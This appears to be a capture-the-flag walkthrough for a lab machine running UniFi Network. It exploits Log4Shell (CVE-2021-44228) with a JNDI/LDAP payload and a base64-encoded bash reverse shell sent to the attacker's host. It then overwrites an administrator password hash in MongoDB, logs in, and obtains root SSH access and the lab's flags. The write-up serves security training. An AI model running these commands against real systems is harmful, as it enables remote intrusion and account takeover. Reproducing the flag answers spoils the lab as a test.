## Unified Solution

### Which are the first four open ports?

1. Run the following to discover open ports:
   ```
   nmap -sV  {target_ip)
   ```
   
   ![Screenshot 2024-03-10 at 6 48 51 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/42db2934-de9e-45dc-ad01-ee3a08cdab9e)


**Answer: 22,6789,8080,8443**

## What is the title of the software that is running running on port 8443?

1. We know from the previous section that 8443 is an ssl service. We know that port 8080 is http service. Lets first checkout **{target_ip}:8080** in our browser. This redirects to a website `https://{target_ip}:8443/manage/account/login?redirect=%2Fmanage`
   
![Screenshot 2024-03-10 at 6 54 40 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/424d51b0-791f-49e5-b71d-4a52699dee4e)

2. According to the hint we need to look at the `title`. So we inspect the website in our browser and see that the find that in the `head` tag we find a `title` tag containing **UniFi Network**
   
![Screenshot 2024-03-10 at 6 58 58 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/df1aad6c-3531-4a70-9819-94442093ff1d)

**Answer: UniFi Network** 

## What is the version of the software that is running?

1. Looking at the website we were redirected to we find the version.

   ![Screenshot 2024-03-10 at 7 00 50 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/a32fdb77-3c78-4fb8-b03a-5d61bd3d31f7)

**Answer: 6.4.54**

## What is the CVE for the identified vulnerability?

Hint : Look for UniFi vulnerabilities in 2021

1. Just do a google search for **unifi network version 6.4.54 cve**

**Answer: CVE-2021-44228** 

## What protocol does JNDI leverage in the injection?

1. We can just read the details of CVE that we found [https://nvd.nist.gov/vuln/detail/CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

**Answer: LDAP ** 

## What tool do we use to intercept the traffic, indicating the attack was successful?

*Hint: Not wireshark*

1. Let's just do a lookup for alternative software to wireshark

**Answer: tcpdump**


## What port do we need to inspect intercepted traffic for?
*Hint: Default port for LDAP*

1. Let's do a lookup for default LDAP port

**Answer: 389**


## What port is the MongoDB service running on?

*Hint: Check the running processes on the system*

![Screenshot 2024-03-15 at 1 28 38 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/7989e4c4-5917-4239-a5f6-8b732cf9da03)
![Screenshot 2024-03-15 at 1 29 29 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/c3d4fcf2-6bc0-4e71-8caf-916e48e87c35)
![Screenshot 2024-03-15 at 1 31 27 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/3e1b9c42-0444-4ee0-915e-a2eaff881b70)


![Screenshot 2024-03-15 at 1 47 20 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/d710e27c-8a08-4bbb-aadd-8269bb840f03)
![Screenshot 2024-03-15 at 1 49 57 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/75338ac5-9b49-4c30-a0a9-9b3119c541be)
![Screenshot 2024-03-15 at 1 47 08 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/9b1e7b71-06df-42b2-99a8-7a3dfb8e5302)

This will convert the reverse shell payload to base64. 
```echo 'bash -c bash -i >&/dev/tcp/{Your IP Address}/{A port of your choice} 0>&1' | base64```


```java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}|{base64,-d}|{bash,-i}" --hostname "{YOUR TUN0 IP ADDRESS}"```


open new terminal netcat listener


```nc -lvp 4444```

Go back to burp and edit the remmber 
${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}




We now have a shell in our netcat listener now let's upgrade it 



![Screenshot 2024-03-15 at 2 40 37 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/623bfe9f-b4ef-40d7-ac5e-f64e3551d63e)

![Screenshot 2024-03-15 at 10 37 08 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/394f9896-bd86-4898-8810-0a8ba2636bd5)


now let's upgrade it into a bash shell

```script /dev/null -c bash```

![Screenshot 2024-03-15 at 10 06 21 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/d0b07957-14c2-4637-a951-6f65d1dc503c)



## What port is the MongoDB service running on?
1. Let's list down all the services in our target by running the command
   ``` ps aux | grep mongo```
![Screenshot 2024-03-15 at 10 47 02 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/5aff177d-c25c-4be3-bea7-d895682c81d1)

**Answer: 27117**

## What is the default database name for UniFi applications?
*Hint: Connect to Mongo and list the databases*

1. Let's connect to mongo runningin  port 27117
   ```
   mongo --port 27117
   ```
![Screenshot 2024-03-15 at 10 54 54 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/a9b10320-f5b1-491b-82f0-865267aa6178)

2. Let's list all databases
```show dbs```

![Screenshot 2024-03-15 at 10 56 56 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/452d21ea-a394-4545-84f2-d2bfd3672a5b)

**Answer: ace ** 

## What is the function we use to enumerate users within the database in MongoDB?

*Hint: Search for "find items in mongo" in Google*

1. Upon our google search we find ```db.admin.find()**

**Answer: db.admin.find()**

## What is the function we use to update users within the database in MongoDB?

*Hint: Search for "update items in mongo" in Google*

**Answer:db.admin.update()**

## What is the password for the root user?

1. Now we have access to mongodb let's enumerate all the users in the unify's ace database to see if there an interesting user. the forEach here beautifies the output to a readable json.
```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

OR 

```bash
use ace
db.admin.find().forEach(printjson);
```
![Screenshot 2024-03-15 at 11 39 29 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/a03cd21f-9382-4171-928d-aac68efca37e)

2. We have found a hash in the key `x_shadow` which represents the password `$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.` 
3. From the hash the value $6$ gives away that sha-512 There is no quick way or tools to crack this hash. So we can attempt to create our own and update the administrator's password.
4. Let's create our own hash
   ```bash
   mkpasswd -m sha-512 Password1234
   ```
$6$DxHn0.Rx4LOznIAe$7YW85uGrCz.DvLORVa0jSDsn6ecADE3sVSH.i0lNpg19y30b83NfOSlpaii2cpbQWkwmxgP31OeZEnS2l5nvI0

![Screenshot 2024-03-15 at 11 46 33 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/774e784d-a548-4bbd-8980-a499a28042f0)

5. Now let's update the administrator's password

```bash
use ace
db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$DxHn0.Rx4LOznIAe$7YW85uGrCz.DvLORVa0jSDsn6ecADE3sVSH.i0lNpg19y30b83NfOSlpaii2cpbQWkwmxgP31OeZEnS2l5nvI0"}})
```
OR 

```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$DxHn0.Rx4LOznIAe$7YW85uGrCz.DvLORVa0jSDsn6ecADE3sVSH.i0lNpg19y30b83NfOSlpaii2cpbQWkwmxgP31OeZEnS2l5nvI0"}})'
```
![Screenshot 2024-03-16 at 12 01 11 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/a01a30d1-329d-4c8c-8c94-9ce78ba53f0c)


6. Now let's go to the unifi website again and try the user `administrator` and the modified password `Password1234`

![Screenshot 2024-03-16 at 12 03 26 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/76b63376-a2a6-4ef1-85ec-8f439c887383)

7. We now have logged in.
![Screenshot 2024-03-16 at 12 04 40 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/9dcc2a6f-b36c-4e45-8084-196bd393f5ea)

8. Navigate to settings to see if there is something interesting, in which we find out that SSH authentication can be enabled and `root` passowrd is viewable.
   
![Screenshot 2024-03-16 at 12 07 10 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/9f7f76d1-f70e-49e1-9ed2-9adf35a5ad5c)


**Answer: NotACrackablePassword4U2022**

## Submit user flag

1. Now let's try to connect via ssh. Open a new terminal and execute the following. (Use the password found in the settings)

```bash
ssh root@{target_ip_address}
```

2. We have succesfully connected and now have a shell with root privileges.
![Screenshot 2024-03-16 at 12 10 16 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/b04c7efe-b47d-488e-9dbe-038fa8ccc430)

3. Let's look for `user.txt` file
```bash
find -type f -name "user.txt"
```
![Screenshot 2024-03-16 at 12 17 23 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/87ac9c65-a171-4e14-9538-57c8c290e1e7)

**Answer: 6ced1a6a89e666c0620cdb10262ba127**


## Submit root flag
1. Let's look for `root.txt` file
```bash
find -type f -name "root.txt"
```

![Screenshot 2024-03-16 at 12 19 48 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/e012ab61-90a1-41ca-82ea-c125e381fe6d)

**Answer: e50bc93c75b634e4b272d2f771c33681 **
   




